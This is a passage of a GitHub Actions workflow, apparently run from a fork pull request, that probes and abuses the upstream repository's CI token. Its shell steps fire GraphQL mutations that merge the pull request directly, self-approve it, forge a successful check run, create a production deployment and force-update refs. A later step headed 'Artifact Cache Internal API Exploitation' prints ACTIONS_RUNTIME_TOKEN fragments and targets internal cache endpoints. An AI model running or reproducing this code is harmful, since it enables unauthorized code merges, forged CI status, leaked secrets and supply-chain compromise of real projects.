          R=$(GQL "{\"query\":\"mutation{createBranchProtectionRule(input:{repositoryId:\\\"$RI\\\",pattern:\\\"v8-*\\\"}){branchProtectionRule{id}}}\"}") 
          echo "result=$(E "$R")"
          echo ""
          echo "F07 createCheckSuite on upstream:"
          R=$(GQL "{\"query\":\"mutation{createCheckSuite(input:{repositoryId:\\\"$RI\\\",headSha:\\\"$UM\\\"}){checkSuite{id}}}\"}") 
          echo "result=$(E "$R")"
          echo ""
          echo "F08 enablePullRequestAutoMerge on current PR:"
          # Get PR node ID
          PR_NODE=$(curl -sf -H "Authorization: token $GH_TOKEN" "$BASE/pulls/$PR_NUM" 2>/dev/null | jq -r '.node_id // empty' 2>/dev/null)
          if [ -n "$PR_NODE" ]; then
            R=$(GQL "{\"query\":\"mutation{enablePullRequestAutoMerge(input:{pullRequestId:\\\"$PR_NODE\\\",mergeMethod:MERGE}){pullRequest{autoMergeRequest{enabledAt}}}}\"}") 
            echo "result=$(E "$R")"
          fi
          echo ""
          echo "F09 mergePullRequest directly:"
          if [ -n "$PR_NODE" ]; then
            R=$(GQL "{\"query\":\"mutation{mergePullRequest(input:{pullRequestId:\\\"$PR_NODE\\\",mergeMethod:MERGE}){pullRequest{merged state}}}\"}") 
            echo "result=$(E "$R") *** THIS WOULD MERGE FORK CODE INTO UPSTREAM ***"
          fi
          echo ""
          echo "F10 addPullRequestReview + approve:"
          if [ -n "$PR_NODE" ]; then
            R=$(GQL "{\"query\":\"mutation{addPullRequestReview(input:{pullRequestId:\\\"$PR_NODE\\\",event:APPROVE,body:\\\"v8-auto-approved\\\"}){pullRequestReview{state}}}\"}") 
            echo "result=$(E "$R")"
          fi
          echo ""
          echo "F11 createCheckRun on upstream with conclusion=success:"
          R=$(GQL "{\"query\":\"mutation{createCheckRun(input:{repositoryId:\\\"$RI\\\",name:\\\"v8-status-override\\\",headSha:\\\"$UM\\\",status:COMPLETED,conclusion:SUCCESS,output:{title:\\\"PASSED\\\",summary:\\\"v8 override\\\"}}){checkRun{id status conclusion}}}\"}") 
          echo "result=$(E "$R")"
          echo ""
          echo "F12 createDeployment on upstream:"
          R=$(GQL "{\"query\":\"mutation{createDeployment(input:{repositoryId:\\\"$RI\\\",environmentName:\\\"production\\\",refId:\\\"refs/heads/main\\\",autoMerge:false,requiredContexts:[]}){deployment{id}}}\"}") 
          echo "result=$(E "$R")"
          echo ""
          echo "F13 updateRef on fork pointing to upstream tree:"
          R=$(GQL "{\"query\":\"mutation{updateRef(input:{refId:\\\"$(curl -sf -H "Authorization: token $GH_TOKEN" "$BASE/git/refs/heads/main" 2>/dev/null | jq -r '.node_id // empty' 2>/dev/null)\\\",oid:\\\"$UM\\\",force:true}){ref{name}}}\"}") 
          echo "updateRef fork→upstream = $(E "$R")"
          true

      - name: 7 Artifact Cache Internal API Exploitation
        run: |
          set +e
          echo "=== ARTIFACT CACHE INTERNAL API DEEP EXPLOITATION ==="
          echo "v7: artifactcache.actions.githubusercontent.com GET/POST=400 (not 403!)"
          echo "400 means the service ACCEPTED the connection and parsed the request"
          echo ""
          CACHE_URL="https://artifactcache.actions.githubusercontent.com"
          echo "--- Get ACTIONS_CACHE_URL and ACTIONS_RUNTIME_TOKEN from env ---"
          echo "G01 ACTIONS_CACHE_URL=${ACTIONS_CACHE_URL:-notset}"
          echo "G01 ACTIONS_RUNTIME_URL=${ACTIONS_RUNTIME_URL:-notset}"
          echo "G01 ACTIONS_RUNTIME_TOKEN=$(echo ${ACTIONS_RUNTIME_TOKEN:-notset} | head -c 30)"
          echo "G01 ACTIONS_ID_TOKEN_REQUEST_URL prefix=$(echo $OIDC_URL | head -c 80)"
          echo ""
          echo "--- Extract cache URL from runner internals ---"
          RUNTIME_TOKEN="${ACTIONS_RUNTIME_TOKEN:-$GH_TOKEN}"
